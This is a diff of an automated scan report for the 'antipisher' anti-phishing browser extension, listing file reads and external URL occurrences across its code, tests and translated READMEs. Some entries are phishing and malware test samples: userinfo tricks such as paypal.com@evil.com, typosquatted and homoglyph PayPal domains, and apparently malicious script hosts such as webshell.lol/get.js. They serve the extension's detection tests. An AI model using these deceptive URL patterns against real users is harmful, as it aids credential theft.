+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 7,
+        "code": "const sitesCode = fs.readFileSync(path.join(__dirname, '../shared/sites.js'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 69,
+        "code": "const chromeManifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../chrome/manifest.json'), 'utf8'));"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 70,
+        "code": "const firefoxManifest = JSON.parse(fs.readFileSync(path.join(__dirname, '../firefox/manifest.json'), 'utf8'));"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 89,
+        "code": "const popupHtml = fs.readFileSync(path.join(__dirname, '../shared/popup.html'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 90,
+        "code": "const popupJs = fs.readFileSync(path.join(__dirname, '../shared/popup.js'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 91,
+        "code": "const popupCss = fs.readFileSync(path.join(__dirname, '../shared/popup.css'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 104,
+        "code": "const optionsHtml = fs.readFileSync(path.join(__dirname, '../shared/options.html'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 105,
+        "code": "const optionsCss = fs.readFileSync(path.join(__dirname, '../shared/options.css'), 'utf8');"
+      },
+      {
+        "file": "tests/options-and-whitelist.test.cjs",
+        "line": 106,
+        "code": "const optionsJs = fs.readFileSync(path.join(__dirname, '../shared/options.js'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 100,
+        "code": "const manifest = JSON.parse(fs.readFileSync(path.join(root, browser, 'manifest.json'), 'utf8'));"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 111,
+        "code": "const tokens = fs.readFileSync(path.join(root, 'shared', 'design-tokens.css'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 112,
+        "code": "const popupCss = fs.readFileSync(path.join(root, 'shared', 'popup.css'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 113,
+        "code": "const guardCss = fs.readFileSync(path.join(root, 'shared', 'guard.css'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 114,
+        "code": "const popup = fs.readFileSync(path.join(root, 'shared', 'popup.html'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 115,
+        "code": "const guardJs = fs.readFileSync(path.join(root, 'shared', 'guard.js'), 'utf8');"
+      },
+      {
+        "file": "tests/p0-regressions.test.cjs",
+        "line": 127,
+        "code": "const shield = fs.readFileSync(path.join(root, 'shared', 'shield-content.js'), 'utf8');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 94,
+        "code": "vm.runInContext(fs.readFileSync(path.join(ROOT, 'chrome', file), 'utf8'), context);"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 97,
+        "code": "vm.runInContext(fs.readFileSync(path.join(ROOT, 'chrome', 'background.js'), 'utf8'), context);"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 145,
+        "code": "vm.runInContext(fs.readFileSync(path.join(ROOT, 'firefox', f), 'utf8'), context);"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 148,
+        "code": "vm.runInContext(fs.readFileSync(path.join(ROOT, 'firefox', 'background.js'), 'utf8'), context);"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 169,
+        "code": "const popupHtml = fs.readFileSync(path.join(ROOT, 'shared', 'popup.html'), 'utf8');"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 284,
+        "code": "const sbom = JSON.parse(fs.readFileSync(sbomPath, 'utf8'));"
+      },
+      {
+        "file": "tests/platin-security.test.cjs",
+        "line": 296,
+        "code": "const actualHash = crypto.createHash('sha256').update(fs.readFileSync(full)).digest('hex');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 91,
+        "code": "const sitesCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'sites.js'), 'utf8');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 92,
+        "code": "const detectorCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'detector.js'), 'utf8');"
+      },
+      {
+        "file": "tests/shield-content.test.cjs",
+        "line": 93,
+        "code": "const shieldCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'shield-content.js'), 'utf8');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 82,
+        "code": "const aegisCode = fs.readFileSync(path.join(__dirname, '..', 'shared', 'aegis-engine.js'), 'utf8');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 91,
+        "code": "const rules = JSON.parse(fs.readFileSync(filePath, 'utf8'));"
       }
     ]
   },
   "secret_pattern_hits": [],
   "external_url_occurrences": [
     {
-      "file": "chrome/manifest.json",
-      "line": 16,
+      "file": "chrome/background.js",
+      "line": 222,
       "url": "http://*/*"
     },
     {
-      "file": "chrome/manifest.json",
-      "line": 17,
+      "file": "chrome/background.js",
+      "line": 222,
       "url": "https://*/*"
     },
     {
       "file": "chrome/manifest.json",
-      "line": 37,
+      "line": 18,
       "url": "http://*/*"
     },
     {
       "file": "chrome/manifest.json",
-      "line": 38,
+      "line": 19,
       "url": "https://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 40,
+      "url": "http://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 41,
+      "url": "https://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 54,
+      "url": "http://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 55,
+      "url": "https://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 80,
+      "url": "http://*/*"
+    },
+    {
+      "file": "chrome/manifest.json",
+      "line": 81,
+      "url": "https://*/*"
+    },
+    {
+      "file": "chrome/shared/aegis-engine.js",
+      "line": 843,
+      "url": "https://localhost/"
+    },
+    {
+      "file": "chrome/shared/aegis-engine.js",
+      "line": 1024,
+      "url": "https://localhost/"
     },
     {
       "file": "chrome/shared/detector.js",
-      "line": 207,
+      "line": 570,
       "url": "https://brand.com@evil.com/"
     },
     {
-      "file": "firefox/background.js",
+      "file": "chrome/shared/detector.js",
+      "line": 571,
+      "url": "https://paypal@paypal.com/"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 18,
+      "url": "https://example.com`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
       "line": 19,
+      "url": "https://www.paypal.com`,"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 19,
+      "url": "https://www.sparkasse.de`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 20,
+      "url": "https://paypa1.com`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 21,
+      "url": "https://pаypal.com`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 22,
+      "url": "https://paypal-rechnung.com`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 23,
+      "url": "https://paypal.de`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 24,
+      "url": "https://www.google.co.jp`"
+    },
+    {
+      "file": "docs/TESTING-ALPHA.md",
+      "line": 27,
+      "url": "https://example.com/#/route`"
+    },
+    {
+      "file": "firefox/background.js",
+      "line": 84,
       "url": "http://*/*"
     },
     {
       "file": "firefox/background.js",
-      "line": 19,
+      "line": 84,
       "url": "https://*/*"
     },
     {
-      "file": "firefox/manifest.json",
-      "line": 14,
+      "file": "firefox/background.js",
+      "line": 149,
       "url": "http://*/*"
+    },
+    {
+      "file": "firefox/background.js",
+      "line": 149,
+      "url": "https://*/*"
     },
     {
       "file": "firefox/manifest.json",
       "line": 15,
+      "url": "http://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 16,
       "url": "https://*/*"
     },
     {
+      "file": "firefox/manifest.json",
+      "line": 41,
+      "url": "http://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 42,
+      "url": "https://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 55,
+      "url": "http://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 56,
+      "url": "https://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 72,
+      "url": "http://*/*"
+    },
+    {
+      "file": "firefox/manifest.json",
+      "line": 73,
+      "url": "https://*/*"
+    },
+    {
+      "file": "firefox/shared/aegis-engine.js",
+      "line": 843,
+      "url": "https://localhost/"
+    },
+    {
+      "file": "firefox/shared/aegis-engine.js",
+      "line": 1024,
+      "url": "https://localhost/"
+    },
+    {
       "file": "firefox/shared/detector.js",
-      "line": 207,
+      "line": 570,
       "url": "https://brand.com@evil.com/"
     },
     {
-      "file": "README.md",
-      "line": 26,
-      "url": "https://paypa1.com`"
+      "file": "firefox/shared/detector.js",
+      "line": 571,
+      "url": "https://paypal@paypal.com/"
     },
     {
-      "file": "README.md",
-      "line": 26,
-      "url": "https://amzaon.com`"
+      "file": "README.de.md",
+      "line": 8,
+      "url": "https://img.shields.io/badge/License-AGPL_v3-blue.svg?style=for-the-badge"
     },
     {
-      "file": "README.md",
-      "line": 76,
+      "file": "README.de.md",
+      "line": 9,
+      "url": "https://img.shields.io/badge/Version-0.2.3--alpha-10b981.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.de.md",
+      "line": 9,
+      "url": "https://github.com/visiongaiatechnology/antipisher"
+    },
+    {
+      "file": "README.de.md",
+      "line": 10,
+      "url": "https://img.shields.io/badge/Tests-91%2F91_Passing-2ea043.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.de.md",
+      "line": 11,
+      "url": "https://img.shields.io/badge/Telemetrie-Keine_%2F_100%25_Offline-0284c7.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.de.md",
+      "line": 12,
+      "url": "https://img.shields.io/badge/Chrome-MV3_Bereit-f59e0b.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.de.md",
+      "line": 13,
+      "url": "https://img.shields.io/badge/Firefox-MV3_Bereit-ef4444.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.de.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/chrome-v0.2.3-alpha/Antipisher-Chrome-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.de.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/chrome-v0.2.3-alpha"
+    },
+    {
+      "file": "README.de.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/firefox-v0.2.3-alpha/Antipisher-Firefox-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.de.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/firefox-v0.2.3-alpha"
+    },
+    {
+      "file": "README.de.md",
+      "line": 34,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/v0.2.3-alpha"
+    },
+    {
+      "file": "README.de.md",
+      "line": 58,
+      "url": "https://1688360.cc/track.js"
+    },
+    {
+      "file": "README.de.md",
+      "line": 77,
+      "url": "https://paypal.com@evil.com/`"
+    },
+    {
+      "file": "README.de.md",
+      "line": 78,
+      "url": "https://unrelated.com/paypal/login`,"
+    },
+    {
+      "file": "README.de.md",
+      "line": 78,
+      "url": "https://phish-host.org/paypal.com/verify`"
+    },
+    {
+      "file": "README.de.md",
+      "line": 253,
       "url": "https://www.unicode.org/reports/tr39/"
+    },
+    {
+      "file": "README.de.md",
+      "line": 254,
+      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
+    },
+    {
+      "file": "README.de.md",
+      "line": 255,
+      "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest/onBeforeRequest"
+    },
+    {
+      "file": "README.de.md",
+      "line": 256,
+      "url": "https://publicsuffix.org/"
+    },
+    {
+      "file": "README.de.md",
+      "line": 257,
+      "url": "https://developer.chrome.com/docs/webstore/program-policies/policies"
+    },
+    {
+      "file": "README.md",
+      "line": 8,
+      "url": "https://img.shields.io/badge/License-AGPL_v3-blue.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 9,
+      "url": "https://img.shields.io/badge/Version-0.2.3--alpha-10b981.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 9,
+      "url": "https://github.com/visiongaiatechnology/antipisher"
+    },
+    {
+      "file": "README.md",
+      "line": 10,
+      "url": "https://img.shields.io/badge/Tests-91%2F91_Passing-2ea043.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 11,
+      "url": "https://img.shields.io/badge/Telemetry-Zero_%2F_100%25_Offline-0284c7.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 12,
+      "url": "https://img.shields.io/badge/Chrome-MV3_Ready-f59e0b.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 13,
+      "url": "https://img.shields.io/badge/Firefox-MV3_Ready-ef4444.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/chrome-v0.2.3-alpha/Antipisher-Chrome-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/chrome-v0.2.3-alpha"
+    },
+    {
+      "file": "README.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/firefox-v0.2.3-alpha/Antipisher-Firefox-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/firefox-v0.2.3-alpha"
+    },
+    {
+      "file": "README.md",
+      "line": 34,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/v0.2.3-alpha"
+    },
+    {
+      "file": "README.md",
+      "line": 58,
+      "url": "https://1688360.cc/track.js"
     },
     {
       "file": "README.md",
       "line": 77,
-      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
+      "url": "https://paypal.com@evil.com/`"
     },
     {
       "file": "README.md",
       "line": 78,
+      "url": "https://unrelated.com/paypal/login`,"
+    },
+    {
+      "file": "README.md",
+      "line": 78,
+      "url": "https://phish-host.org/paypal.com/verify`"
+    },
+    {
+      "file": "README.md",
+      "line": 252,
+      "url": "https://www.unicode.org/reports/tr39/"
+    },
+    {
+      "file": "README.md",
+      "line": 253,
+      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
+    },
+    {
+      "file": "README.md",
+      "line": 254,
       "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest/onBeforeRequest"
     },
     {
       "file": "README.md",
-      "line": 79,
-      "url": "https://tranco-list.eu/"
+      "line": 255,
+      "url": "https://publicsuffix.org/"
     },
     {
       "file": "README.md",
-      "line": 80,
-      "url": "https://blog.cloudflare.com/radar-2025-year-in-review-internet-services/"
+      "line": 256,
+      "url": "https://developer.chrome.com/docs/webstore/program-policies/policies"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 8,
+      "url": "https://img.shields.io/badge/License-AGPL_v3-blue.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 9,
+      "url": "https://img.shields.io/badge/Version-0.2.3--alpha-10b981.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 9,
+      "url": "https://github.com/visiongaiatechnology/antipisher"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 10,
+      "url": "https://img.shields.io/badge/Tests-91%2F91_Passing-2ea043.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 11,
+      "url": "https://img.shields.io/badge/Телеметрия-0_%2F_100%25_Офлайн-0284c7.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 12,
+      "url": "https://img.shields.io/badge/Chrome-MV3_Готов-f59e0b.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 13,
+      "url": "https://img.shields.io/badge/Firefox-MV3_Готов-ef4444.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/chrome-v0.2.3-alpha/Antipisher-Chrome-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/chrome-v0.2.3-alpha"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/firefox-v0.2.3-alpha/Antipisher-Firefox-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/firefox-v0.2.3-alpha"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 34,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/v0.2.3-alpha"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 69,
+      "url": "https://paypal.com@evil.com/`"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 70,
+      "url": "https://unrelated.com/paypal/login`,"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 70,
+      "url": "https://phish-host.org/paypal.com/verify`"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 245,
+      "url": "https://www.unicode.org/reports/tr39/"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 246,
+      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 247,
+      "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest/onBeforeRequest"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 248,
+      "url": "https://publicsuffix.org/"
+    },
+    {
+      "file": "README.ru.md",
+      "line": 249,
+      "url": "https://developer.chrome.com/docs/webstore/program-policies/policies"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 8,
+      "url": "https://img.shields.io/badge/License-AGPL_v3-blue.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 9,
+      "url": "https://img.shields.io/badge/Version-0.2.3--alpha-10b981.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 9,
+      "url": "https://github.com/visiongaiatechnology/antipisher"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 10,
+      "url": "https://img.shields.io/badge/Tests-91%2F91_Passing-2ea043.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 11,
+      "url": "https://img.shields.io/badge/遥测-零_%2F_100%25_离线-0284c7.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 12,
+      "url": "https://img.shields.io/badge/Chrome-MV3_就绪-f59e0b.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 13,
+      "url": "https://img.shields.io/badge/Firefox-MV3_就绪-ef4444.svg?style=for-the-badge"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/chrome-v0.2.3-alpha/Antipisher-Chrome-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 32,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/chrome-v0.2.3-alpha"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/download/firefox-v0.2.3-alpha/Antipisher-Firefox-v0.2.3-alpha.zip"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 33,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/firefox-v0.2.3-alpha"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 34,
+      "url": "https://github.com/visiongaiatechnology/antipisher/releases/tag/v0.2.3-alpha"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 69,
+      "url": "https://paypal.com@evil.com/`）。"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 70,
+      "url": "https://unrelated.com/paypal/login`、`https://phish-host.org/paypal.com/verify`），同时放行合法的开发者文档、API"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 245,
+      "url": "https://www.unicode.org/reports/tr39/"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 246,
+      "url": "https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 247,
+      "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest/onBeforeRequest"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 248,
+      "url": "https://publicsuffix.org/"
+    },
+    {
+      "file": "README.zh.md",
+      "line": 249,
+      "url": "https://developer.chrome.com/docs/webstore/program-policies/policies"
+    },
+    {
+      "file": "scripts/publish_github_releases.py",
+      "line": 90,
+      "url": "https://api.github.com/repos/{REPO}/releases"
+    },
+    {
+      "file": "scripts/publish_github_releases.py",
+      "line": 127,
+      "url": "https://api.github.com/repos/{REPO}/releases/assets/{asset_id}"
+    },
+    {
+      "file": "shared/aegis-engine.js",
+      "line": 843,
+      "url": "https://localhost/"
+    },
+    {
+      "file": "shared/aegis-engine.js",
+      "line": 1024,
+      "url": "https://localhost/"
     },
     {
       "file": "shared/detector.js",
-      "line": 207,
+      "line": 570,
       "url": "https://brand.com@evil.com/"
+    },
+    {
+      "file": "shared/detector.js",
+      "line": 571,
+      "url": "https://paypal@paypal.com/"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 9,
+      "url": "https://news.example.com/article/123"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 309,
+      "url": "https://serve.popads.net/popunder.php"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 340,
+      "url": "https://www.youtube.com/watch?v=1vaCngYR7aU"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 362,
+      "url": "https://www.youtube.com/watch?v=1vaCngYR7aU"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 390,
+      "url": "https://www.youtube.com/watch?v=1vaCngYR7aU"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 424,
+      "url": "https://www.youtube.com/youtubei/v1/player?key=123"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 435,
+      "url": "https://www.youtube.com/watch?v=1vaCngYR7aU"
+    },
+    {
+      "file": "tests/adblock-shield.test.cjs",
+      "line": 478,
+      "url": "https://www.youtube.com/watch?v=1vaCngYR7aU"
     },
     {
       "file": "tests/chrome-worker.test.cjs",
@@ -667,22 +3661,32 @@
     },
     {
       "file": "tests/chrome-worker.test.cjs",
-      "line": 54,
+      "line": 56,
+      "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/chrome-worker.test.cjs",
+      "line": 62,
+      "url": "https://google.com/"
+    },
+    {
+      "file": "tests/chrome-worker.test.cjs",
+      "line": 75,
       "url": "https://paypa1.com/#fragment"
     },
     {
       "file": "tests/chrome-worker.test.cjs",
-      "line": 59,
+      "line": 83,
       "url": "https://paypa1.com/"
     },
     {
       "file": "tests/chrome-worker.test.cjs",
-      "line": 60,
-      "url": "https://paypa1.com/"
+      "line": 103,
+      "url": "https://example.com/?q="
     },
     {
       "file": "tests/chrome-worker.test.cjs",
-      "line": 70,
+      "line": 117,
       "url": "https://paypa1.com/"
     },
     {
@@ -954,12 +3958,503 @@
       "file": "tests/firefox-worker.test.cjs",
       "line": 34,
       "url": "https://paypa1.com/"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 55,
+      "url": "https://cdn.optimizely.com/js/6395285578973184.js"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 56,
+      "url": "https://logx.optimizely.com/v1/events"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 57,
+      "url": "https://1688360.cc/track.js"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 58,
+      "url": "https://5vobauua3ojpklx.icu/boot.js"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 59,
+      "url": "https://webshell.lol/get.js"
+    },
+    {
+      "file": "tests/firefox-worker.test.cjs",
+      "line": 66,
+      "url": "https://gitlab.com/assets/application.js"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 161,
+      "url": "https://example.com/"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 272,
+      "url": "https://1688360.cc/track.js"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 273,
+      "url": "https://webshell.lol/get.js"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 274,
+      "url": "https://5vobauua3ojpklx.icu/B9/index.html"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 275,
+      "url": "https://example.com/static/app.js"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 276,
+      "url": "https://js.stripe.com/v3/"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 280,
+      "url": "https://1688360.cc/track.js"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 294,
+      "url": "https://1688360.cc/card.php"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 299,
+      "url": "https://example.com/api/keepalive"
+    },
+    {
+      "file": "tests/gedefense-light.test.cjs",
+      "line": 301,
+      "url": "https://example.com/api/keepalive"
+    },
+    {
+      "file": "tests/i18n.test.cjs",
+      "line": 80,
+      "url": "https://paypa1.com"
+    },
+    {
+      "file": "tests/options-and-whitelist.test.cjs",
+      "line": 33,
+      "url": "https://paypa1.corp/login"
+    },
+    {
+      "file": "tests/options-and-whitelist.test.cjs",
+      "line": 46,
+      "url": "https://auth.sub.paypa1.corp/login"
+    },
+    {
+      "file": "tests/options-and-whitelist.test.cjs",
+      "line": 54,
+      "url": "https://paypa1.corp/login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 14,
+      "url": "https://paypal.force.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 15,
+      "url": "https://paypal.force.com/login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 16,
+      "url": "https://evil.force.com/paypal/login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 21,
+      "url": "https://force.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 21,
+      "url": "https://github.io/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 21,
+      "url": "https://vercel.app/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 21,
+      "url": "https://netlify.app/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 21,
+      "url": "https://wordpress.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 42,
+      "url": "https://google.com.pe/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 44,
+      "url": "https://paypal.de/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 48,
+      "url": "https://paypal.xyz/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 55,
+      "url": "https://www.heise.de/ratgeber/paypal-login-problem-123.html"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 56,
+      "url": "https://www.verbraucherzentrale.de/wissen/paypal-login-12345"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 57,
+      "url": "https://duckduckgo.com/?q=paypal.com+login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 58,
+      "url": "https://github.com/paypal/paypal-js/issues/123"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 63,
+      "url": "https://evil.test/paypal/login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 64,
+      "url": "https://evil.test/blog/paypal/login"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 65,
+      "url": "https://evil.test/docs/paypal/verify"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 66,
+      "url": "https://phish-host.org/paypal.com/verify"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 76,
+      "url": "https://paypäl.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 76,
+      "url": "https://päypal.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 76,
+      "url": "https://mïcrosoft.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 76,
+      "url": "https://amazön.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 79,
+      "url": "https://www.über.de/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 84,
+      "url": "https://paypal-rechnung.com/"
+    },
+    {
+      "file": "tests/p0-regressions.test.cjs",
+      "line": 85,
+      "url": "https://dhl-sendung.de/"
+    },
